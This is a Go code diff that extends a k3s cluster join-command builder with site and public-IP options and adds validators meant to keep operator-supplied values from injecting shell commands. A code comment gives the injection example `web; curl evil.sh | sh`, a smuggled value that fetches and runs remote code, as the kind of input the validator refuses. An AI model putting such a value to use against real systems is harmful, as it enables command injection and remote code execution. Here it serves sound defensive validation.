@@ -13,6 +13,7 @@ import (
 	"errors"
 	"fmt"
 	"log/slog"
+	"net/netip"
 	"net/url"
 	"regexp"
 	"strings"
@@ -40,11 +41,18 @@ var ErrNoSecretKey = errors.New(
 // PoolLabel is the node label a pool is carried in.
 const PoolLabel = "yacht/pool"
 
-// A Kubernetes label value, which is also the shape that makes a pool safe to
-// interpolate into a command somebody pastes into a root shell. Every
-// character that could end the command and start another one — a semicolon, a
-// backtick, a newline, a space, a dollar — is outside this set already.
-var poolRE = regexp.MustCompile(`^[a-z0-9]([-a-z0-9._]*[a-z0-9])?$`)
+// SiteLabel is the node label a site is carried in.
+//
+// Kubernetes' own zone label rather than one of ours: the scheduler already
+// knows how to spread pods by it, so nothing has to teach it what a site is.
+const SiteLabel = "topology.kubernetes.io/zone"
+
+// A Kubernetes label value, which is also the shape that makes a pool or a
+// site safe to interpolate into a command somebody pastes into a root shell.
+// Every character that could end the command and start another one — a
+// semicolon, a backtick, a newline, a space, a dollar — is outside this set
+// already.
+var labelValueRE =regexp.MustCompile(`^[a-z0-9]([-a-z0-9._]*[a-z0-9])?$`)
 
 // Joiner stores the join settings and builds the command.
 type Joiner struct {
@@ -128,13 +136,42 @@ func (j *Joiner) SetJoin(ctx context.Context, serverURL, token string, by uuid.U
 	return nil
 }
 
+// Machine is what a join command tells a machine about itself.
+//
+// Every field is optional: an empty Machine is an ordinary node in no pool, at
+// no particular site, reachable at the address on its own interface.
+type Machine struct {
+	// Pool labels the node so apps can be scheduled onto it.
+	Pool string
+
+	// Site is where the machine is: a short name the operator chooses, the
+	// same for every machine in one place.
+	Site string
+
+	// PublicIP is the address machines at other sites reach this one at,
+	// when that is not an address on its own interface — behind NAT, or on a
+	// cloud that routes a floating address to a private one. Empty otherwise.
+	PublicIP string
+}
+
+// Validate checks everything that will be pasted into a root shell.
+func (m Machine) Validate() error {
+	if err := ValidatePool(m.Pool); err != nil {
+		return err
+	}
+	if err := ValidateSite(m.Site); err != nil {
+		return err
+	}
+	return ValidatePublicIP(m.PublicIP)
+}
+
 // Command returns the line to run on a machine to join it to this cluster.
 //
 // The returned string contains the join token in the clear, because that is
 // what the person running it needs. It is the only thing in this package that
 // carries the token, and the only caller is the page an owner asked for.
-func (j *Joiner) Command(ctx context.Context, pool string) (string, error) {
-	if err := ValidatePool(pool); err != nil {
+func (j *Joiner) Command(ctx context.Context, m Machine) (string, error) {
+	if err := m.Validate(); err != nil {
 		return "", err
 	}
 
@@ -160,19 +197,31 @@ func (j *Joiner) Command(ctx context.Context, pool string) (string, error) {
 		return "", fmt.Errorf("cluster: opening the join token: %w", err)
 	}
 
-	return BuildCommand(row.ServerUrl, token, pool), nil
+	return BuildCommand(row.ServerUrl, token, m), nil
 }
 
 // BuildCommand assembles the join line.
 //
-// Split out from Command so the interesting half — turning three values into
+// Split out from Command so the interesting half — turning these values into
 // something that will be pasted into a root shell — is a pure function with no
-// database and no cluster behind it.
-func BuildCommand(serverURL, token, pool string) string {
+// database and no cluster behind it. The machine is expected to have passed
+// Validate.
+func BuildCommand(serverURL, token string, m Machine) string {
 	cmd := "curl -sfL https://get.k3s.io | K3S_URL=" + serverURL +
 		" K3S_TOKEN=" + token + " sh -s -"
-	if pool != "" {
-		cmd += " --node-label " + PoolLabel + "=" + pool
+	if m.Pool != "" {
+		cmd += " --node-label " + PoolLabel + "=" + m.Pool
+	}
+	if m.Site != "" {
+		// Set by the kubelet on its own node. The zone label is one of the few
+		// in the kubernetes.io namespace that NodeRestriction lets it set.
+		cmd += " --node-label " + SiteLabel + "=" + m.Site
+	}
+	if m.PublicIP != "" {
+		// What WireGuard peers at other sites dial. Without it a machine
+		// behind NAT advertises the private address on its interface, which
+		// nothing elsewhere can reach, and its pods are cut off from theirs.
+		cmd += " --node-external-ip " + m.PublicIP
 	}
 	return cmd
 }
@@ -209,17 +258,40 @@ func ValidateServerURL(raw string) error {
 // every character that could end the command and start another one. A pool
 // called `web; curl evil.sh | sh` is refused here rather than quoted and hoped
 // over, because the result is pasted into a root shell.
-func ValidatePool(pool string) error {
-	if pool == "" {
+func ValidatePool(pool string) error { return validateLabelValue("pool", pool) }
+
+// ValidateSite checks a site name, by the same rule and for the same reason as
+// a pool.
+func ValidateSite(site string) error { return validateLabelValue("site", site) }
+
+func validateLabelValue(what, v string) error {
+	if v == "" {
 		return nil // no label, which is a normal node
 	}
-	if len(pool) > 63 {
-		return errors.New("pool name must be at most 63 characters")
+	if len(v) > 63 {
+		return fmt.Errorf("%s name must be at most 63 characters", what)
 	}
-	if !poolRE.MatchString(pool) {
-		return errors.New(
-			"pool name must be lowercase letters, numbers, dashes, dots and underscores, " +
-				"starting and ending with a letter or number")
+	if !labelValueRE.MatchString(v) {
+		return fmt.Errorf(
+			"%s name must be lowercase letters, numbers, dashes, dots and underscores, "+
+				"starting and ending with a letter or number", what)
+	}
+	return nil
+}
+
+// ValidatePublicIP checks a machine's public address.
+//
+// Parsed rather than pattern-matched, and required to read back exactly as
+// given, so there is no spelling of it a shell would take as a second word. A
+// zone ("fe80::1%eth0") names an interface on the machine typing it, which
+// means nothing to a machine anywhere else.
+func ValidatePublicIP(ip string) error {
+	if ip == "" {
+		return nil
+	}
+	addr, err := netip.ParseAddr(ip)
+	if err != nil || addr.Zone() != "" || addr.String() != ip {
+		return errors.New("public address must be an IP address, for example 203.0.113.7")
 	}
 	return nil
 }
